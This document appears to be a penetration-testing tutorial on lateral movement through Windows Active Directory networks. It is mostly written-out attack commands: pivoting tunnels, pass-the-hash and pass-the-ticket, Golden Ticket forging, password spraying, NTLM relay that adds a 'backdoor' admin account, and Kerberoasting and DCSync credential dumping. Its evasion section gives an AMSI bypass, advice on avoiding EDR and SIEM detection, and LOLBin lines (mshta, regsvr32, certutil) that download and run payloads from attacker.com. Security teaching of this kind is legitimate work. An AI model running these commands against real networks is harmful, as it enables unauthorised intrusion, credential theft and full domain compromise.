## Lateral Movement

Lateral movement is where a pentest shifts from proving a single system is vulnerable to proving the entire network can be compromised. The goal mirrors a real ransomware operator or nation-state actor: move through the network, access systems beyond the initial foothold, and demonstrate the true blast radius of a breach.

***

## Why Lateral Movement Matters

Most organisations heavily fortify their perimeter while leaving internal trust relationships dangerously loose. Once inside, attackers frequently encounter flat networks, credential reuse across systems, overprivileged service accounts, and minimal east-west traffic monitoring. Lateral movement exploits all of these simultaneously.

```
Realistic attack scenario parallel:

Ransomware operators follow this exact sequence:
1. Initial access: phishing, RCE on public-facing service
2. Establish persistence and C2
3. Enumerate internal network
4. Move laterally to domain controller
5. Harvest all credentials (NTDS.dit)
6. Spread ransomware payload to all reachable hosts
7. Encrypt and extort

A penetration tester simulates steps 1-6 to prove this is possible
before a real attacker does it with step 7.
CEO-level note: In many countries, CEOs are personally liable for
failure to protect customer data. A pentest report that demonstrates
full domain compromise is a board-level document, not just IT feedback.
```

***

## Pivoting and Tunneling

The compromised host becomes a proxy into network segments that are invisible from the internet and unreachable from your attack machine directly.

```
Understanding the need for pivoting:

External attack machine: 10.50.0.1 (your Kali)
Compromised DMZ host:    10.10.10.5 (public-facing web server)
Internal network:        192.168.1.0/24 (not routable from internet)
Domain Controller:       192.168.1.10 (your real target)

Without pivot: you cannot reach 192.168.1.0/24 at all
With pivot:    all traffic routes through 10.10.10.5 into the internal segment

Pivoting methods:

1. SSH Dynamic Port Forwarding (SOCKS proxy):
   # From attacker machine, create SOCKS5 proxy through compromised host
   ssh -D 1080 -f -N user@10.10.10.5
   # Configure proxychains to use localhost:1080
   echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
   # Now prefix any command with proxychains:
   proxychains nmap -sT -Pn 192.168.1.0/24
   proxychains crackmapexec smb 192.168.1.10
   proxychains evil-winrm -i 192.168.1.10 -u Administrator -p Password123

2. SSH Local Port Forwarding (single service):
   # Forward local port 3389 through pivot to internal host's RDP
   ssh -L 3389:192.168.1.10:3389 user@10.10.10.5
   # Then connect RDP to your own localhost:
   xfreerdp /v:127.0.0.1:3389 /u:Administrator /p:Password123

3. SSH Remote Port Forwarding (reverse tunnel, pivot calls back to you):
   # On compromised host:
   ssh -R 2222:127.0.0.1:22 attacker@10.50.0.1
   # On your attack machine, SSH back through the tunnel:
   ssh -p 2222 user@127.0.0.1

4. Chisel (best option when SSH is unavailable):
   # On attacker machine (server):
   ./chisel server --reverse --port 8080

   # On compromised host (client):
   ./chisel client 10.50.0.1:8080 R:socks
   # Creates SOCKS5 proxy on attacker machine port 1080
   # Use with proxychains as above

5. Metasploit route (post-exploitation, no external tools needed):
   # After getting a Meterpreter session on compromised host:
   meterpreter > run post/multi/manage/autoroute SUBNET=192.168.1.0/24
   # OR from msf console:
   route add 192.168.1.0/24 <session-id>
   # Now all Metasploit modules route through that session:
   use auxiliary/scanner/smb/smb_ms17_010
   set RHOSTS 192.168.1.0/24
   run

6. Sshuttle (transparent proxy, no proxychains needed):
   sshuttle -r user@10.10.10.5 192.168.1.0/24
   # After this, traffic to 192.168.1.0/24 automatically routes through pivot
   nmap 192.168.1.10  # works directly, no proxychains prefix needed

Port forwarding via compromised Windows host:
   # Enable IP forwarding
   netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=445 connectaddress=192.168.1.10
   # Now port 8080 on compromised host forwards to DC's SMB port
```

***

## Internal Network Enumeration After Pivoting

```
Discovery once pivot is established:

Subnet identification (check compromised host first):
  ip a / ipconfig /all       <- all interfaces, find additional subnets
  ip route / route print     <- routing table, other reachable subnets
  arp -a                     <- hosts recently communicated with
  cat /etc/hosts             <- internal hostnames

Host discovery through pivot:
  proxychains nmap -sn 192.168.1.0/24 -oA internal_hosts
  # If ICMP is blocked:
  proxychains nmap -sn -PS22,80,443,445,3389 192.168.1.0/24

Service enumeration through pivot:
  proxychains nmap -sT -Pn -p 22,80,443,445,1433,3306,3389,5985 192.168.1.0/24

SMB enumeration (internal networks often have open SMB):
  proxychains crackmapexec smb 192.168.1.0/24
  # Output reveals: hostnames, OS versions, domain name, SMB signing status

SMB signing status matters:
  # If SMB signing = disabled/not required -> relay attacks are possible
  proxychains crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

LDAP enumeration (find all domain objects):
  proxychains ldapsearch -x -H ldap://192.168.1.10 -b "DC=company,DC=local" -D "user@company.local" -w Password123 > ldap_dump.txt
  # Or with BloodHound:
  proxychains bloodhound-python -u user -p Password123 -d company.local -ns 192.168.1.10 -c all
```

***

## Key Lateral Movement Techniques

### Pass-the-Hash

```
When you have: NTLM hash but not the cleartext password

Extract hashes from compromised Windows host:
  # With SYSTEM privileges:
  sekurlsa::logonpasswords       <- mimikatz, from LSASS memory
  lsadump::sam                   <- mimikatz, from SAM registry
  impacket-secretsdump -just-dc-ntlm company.local/admin:Password123@192.168.1.10

Pass-the-hash to authenticate:
  # WinRM (port 5985):
  evil-winrm -i 192.168.1.20 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

  # SMB:
  crackmapexec smb 192.168.1.0/24 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4

  # RDP (restricted admin mode must be enabled):
  xfreerdp /v:192.168.1.20 /u:Administrator /pth:32ed87bdb5fdc5e9cba88547376818d4

  # PSExec:
  impacket-psexec administrator@192.168.1.20 -hashes :32ed87bdb5fdc5e9cba88547376818d4
```

### Pass-the-Ticket (Kerberos)

```
When you have: a Kerberos ticket (TGT or TGS) from memory

Dump tickets from memory:
  sekurlsa::tickets /export       <- mimikatz, saves .kirbi files
  rubeus dump /nowrap             <- Rubeus, base64 tickets

Import and use ticket:
  kerberos::ptt ticket.kirbi      <- mimikatz, inject into current session
  rubeus ptt /ticket:<base64>

  # Then access resources using ticket (no password needed):
  dir \\DC01\C$
  psexec.exe \\DC01 cmd.exe

Golden Ticket (ultimate persistence - requires Domain Admin first):
  # Dump krbtgt hash (from NTDS.dit or mimikatz on DC):
  lsadump::dcsync /domain:company.local /user:krbtgt
  # Forge TGT for any user, any time, valid until krbtgt hash is rotated:
  kerberos::golden /user:FakeAdmin /domain:company.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
```

### Credential Spraying

```
Password spraying vs brute force:
  Brute force: many passwords against one user   -> causes lockout
  Spray:       one password against many users   -> stays under lockout threshold

Preparation:
  # Get domain password policy first (CRITICAL before spraying):
  crackmapexec smb 192.168.1.10 -u user -p Password123 --pass-pol
  # Note: lockout threshold and observation window
  # If threshold = 5 attempts: spray maximum 3 times then wait out the window

Enumerate valid usernames before spraying:
  # From LDAP:
  ldapsearch -x -H ldap://192.168.1.10 -b "DC=company,DC=local" "(objectClass=user)" sAMAccountName
  # From SMB:
  enum4linux -U 192.168.1.10
  # From Kerberos pre-auth (no creds needed):
  kerbrute userenum --dc 192.168.1.10 -d company.local usernames.txt

Spray with safe password candidates:
  # Common corporate password patterns:
  Season+Year:          Spring2024, Winter2025
  Company+Number:       Company123, Acme2024!
  Welcome patterns:     Welcome1, Welcome123!
  Keyboard walks:       Qwerty123!

  crackmapexec smb 192.168.1.0/24 -u users.txt -p "Spring2024!" --continue-on-success
  kerbrute passwordspray --dc 192.168.1.10 -d company.local users.txt "Spring2024!"
```

### NTLM Relay with Responder

```
When: SMB signing is disabled on target hosts

How it works:
  User authenticates to a fake server (Responder)
  Responder captures NTLMv2 challenge-response hash
  Relay the authentication to a real target
  Result: authenticated session on target as the victim user

Step 1 - Identify relay targets (hosts with SMB signing disabled):
  proxychains crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

Step 2 - Start ntlmrelayx (targeting identified hosts):
  proxychains ntlmrelayx.py -tf relay_targets.txt -smb2support -i
  # -i = interactive shell mode
  # Or for command execution:
  ntlmrelayx.py -tf relay_targets.txt -smb2support -c "net user backdoor P@ss /add && net localgroup administrators backdoor /add"

Step 3 - Start Responder (capture hashes, turn off SMB and HTTP to avoid conflicts):
  # Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
  sudo responder -I eth0 -wdv

Step 4 - Trigger authentication:
  # Wait for a user to browse the network, or force it:
  # If you have write access to a share, drop a malicious LNK or SCF file
  # that triggers authentication when the folder is opened

Offline hash cracking (if relay fails, crack the NTLMv2 hash):
  hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

### BloodHound - Attack Path Mapping

```
BloodHound is the most valuable tool for lateral movement planning.
It maps AD relationships and finds attack paths to Domain Admin.

Data collection:
  # Python collector (from Linux, through pivot):
  proxychains bloodhound-python -u user -p Password123 -d company.local -ns 192.168.1.10 -c all
  # Generates JSON files

  # SharpHound (from Windows, on compromised host):
  .\SharpHound.exe -c all -d company.local --zipfilename bh_data.zip

Import and analyse:
  # Start BloodHound:
  sudo neo4j start
  bloodhound

  # Import JSON files, then run queries:
  "Find Shortest Path to Domain Admins"
  "Find all Domain Admin Group Members"
  "Find Computers where Domain Users are Local Admins"
  "Find Users with DCSync Rights"
  "Shortest Path from Owned Principals to Domain Admins"

  # Mark compromised accounts/hosts as "Owned" in BloodHound
  # BloodHound recalculates shortest path from your owned nodes
```

***

## Evasion During Lateral Movement

Internal networks have more monitoring than many assume. EDR, SIEM, and network monitoring are all active threats during this phase.

```
High-noise actions to avoid during evasive testing:
  Port scanning from compromised host   <- generates obvious sweep traffic
  Running mimikatz.exe as-is            <- AV signature detected immediately
  Spawning cmd.exe from unexpected proc <- EDR alert
  Connecting to DC directly after hours <- SIEM anomaly detection
  Rapid sequential login attempts       <- lockout and SIEM alert

Lower-noise alternatives:

LDAP-based enumeration instead of net commands:
  # Uses normal domain communication, blends into AD traffic
  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

LOLBins for execution:
  # Use trusted Windows binaries to avoid AV detection
  wmic process call create "payload.exe"
  mshta http://attacker.com/payload.hta
  regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
  certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe

Amsi Bypass before running PowerShell tools:
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Traffic blending:
  Use port 443 for all C2 callbacks (HTTPS)
  Use legitimate cloud services for file staging
  Space out commands (add sleep timers between actions)
  Operate during business hours to blend with normal user activity

Avoid scanning from compromised host:
  # Route scans through Metasploit/Chisel pivot from your attack machine
  # The scan appears to come from the compromised host but is controlled by you
  # Slow scan rates blend better:
  proxychains nmap -T2 -sT -Pn 192.168.1.0/24
```

***

## Lateral Movement Decision Flow

```
Compromised host: initial foothold
          |
          v
Identify network interfaces and routing tables
          |
          v
Set up pivot (Chisel / SSH / Metasploit route)
          |
          v
Internal network discovery through pivot
          |
Scan for hosts -> SMB signing check -> LDAP query -> BloodHound collect
          |
          v
Identify lateral movement paths:
  +--> Credential reuse (spray gathered creds against all hosts)
  +--> Pass-the-hash (use harvested NTLM hashes)
  +--> Pass-the-ticket (use Kerberos tickets from memory)
  +--> NTLM relay (if SMB signing disabled)
  +--> BloodHound path (exploit AD trust relationships)
  +--> Kerberoasting (crack service account hashes offline)
  +--> ASREPRoasting (crack accounts with pre-auth disabled)
          |
          v
Gain access to next host
          |
          v
Repeat post-exploitation on new host:
  -> System info, credentials, pillaging, privilege escalation
  -> Feed new credentials and tickets back into lateral movement
          |
          v
Repeat until Domain Admin / forest-wide compromise
OR all in-scope systems assessed
          |
          v
Document every hop, every credential used,
every host compromised with timestamp evidence
```

***

## Kerberoasting and ASREPRoasting

These two techniques are worth highlighting separately as they are among the most common and reliable internal privilege escalation and lateral movement paths found in real engagements.

```
Kerberoasting:
  Principle: Any authenticated domain user can request a TGS for any
             service account. The TGS is encrypted with the service
             account's NTLM hash. You crack it offline.

  Requirements: Valid domain credentials (even low-privilege)

  Step 1 - Find kerberoastable accounts:
    impacket-GetUserSPNs company.local/user:Password123 -dc-ip 192.168.1.10 -request

  Step 2 - Crack offline:
    hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

  High-value targets: SQLService, IIS_AppPool, backup service accounts
  These often have weak passwords and high privileges

ASREPRoasting:
  Principle: Accounts with Kerberos pre-authentication disabled
             return an AS-REP encrypted with the user's hash
             without requiring any credential to request it.

  Requirements: Nothing - no creds needed if you have usernames

  Step 1 - Find vulnerable accounts:
    impacket-GetNPUsers company.local/ -dc-ip 192.168.1.10 -usersfile users.txt -no-pass -request

  Step 2 - Crack offline:
    hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

DCSync (once you have Domain Admin or Replication rights):
  # Mimics a Domain Controller requesting credential replication
  # Dumps all hashes from AD without touching LSASS
  impacket-secretsdump company.local/Admin:Password123@192.168.1.10 -just-dc-ntlm
  # Result: every single NTLM hash in the domain
  # Feed all hashes back into Pass-the-Hash for total network access
```
